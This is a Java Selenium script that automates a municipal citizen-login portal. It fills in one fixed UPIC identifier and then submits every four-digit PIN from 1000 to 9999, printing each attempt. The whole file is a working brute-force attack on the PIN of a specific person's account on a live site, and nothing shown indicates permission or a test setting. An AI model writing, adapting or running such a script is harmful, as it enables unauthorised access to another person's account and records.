import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

//comment the above line and uncomment below line to use Chrome


public class module {


    public static void main(String[] args) throws InterruptedException {
        // declaration and instantiation of objects/variables
    	System.setProperty("webdriver.chrome.driver","C:\\Users\\prana\\Downloads\\chromedriver_win32\\chromedriver.exe");
	
		//comment the above 2 lines and uncomment below 2 lines to use Chrome
		//System.setProperty("webdriver.chrome.driver","G:\\chromedriver.exe");
		WebDriver driver = new ChromeDriver();
    	
        String baseUrl = "http://www.edmcupic.in/";
       

        // launch Fire fox and direct it to the Base URL
        driver.get(baseUrl);
        driver.manage().window().maximize();
        
        driver.findElement(By.xpath("//*[contains(text(),'Login as Citizen')]")).click();
        Thread.sleep(2000);
        for(int i=1000; i<=9999; i++) {
        String s=Integer.toString(i);  
        Thread.sleep(1000);
        driver.findElement(By.xpath("//*[contains(text(),'New User')]")).click();
        driver.findElement(By.xpath("//*[@id='txtUPIC']")).sendKeys("02110119WRA9A00");
        driver.findElement(By.xpath("//*[@id='txtPIN']")).sendKeys(s);
        driver.findElement(By.xpath("(//input[@value='Login'])[1]")).click();
        System.out.println(s);
        driver.findElement(By.xpath("(//button[@value='true'])[1]")).click();
        }
        //close Fire fox
       
       
    }

}